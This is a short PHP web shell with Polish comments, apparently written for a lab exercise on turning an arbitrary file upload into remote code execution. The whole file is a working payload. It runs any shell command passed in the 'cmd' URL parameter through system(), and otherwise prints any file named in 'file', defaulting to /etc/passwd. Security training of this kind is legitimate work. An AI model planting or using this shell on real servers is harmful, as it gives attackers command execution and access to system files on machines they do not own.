<?php
// Web shell do zadania 5.1 (Arbitrary File Upload -> RCE)
// Uzycie:
//   /uploads/shell.php                      -> wyswietla /etc/passwd (readfile)
//   /uploads/shell.php?file=/etc/hostname   -> wyswietla dowolny plik
//   /uploads/shell.php?cmd=id               -> wykonuje dowolna komende (RCE)

echo "<pre>";

if (isset($_GET['cmd'])) {
    // Dowod RCE - wykonanie polecenia systemowego
    system($_GET['cmd'] . ' 2>&1');
} else {
    // Hint z zadania: readfile() wyswietla zawartosc pliku
    $file = isset($_GET['file']) ? $_GET['file'] : '/etc/passwd';
    readfile($file);
}

echo "</pre>";
?>
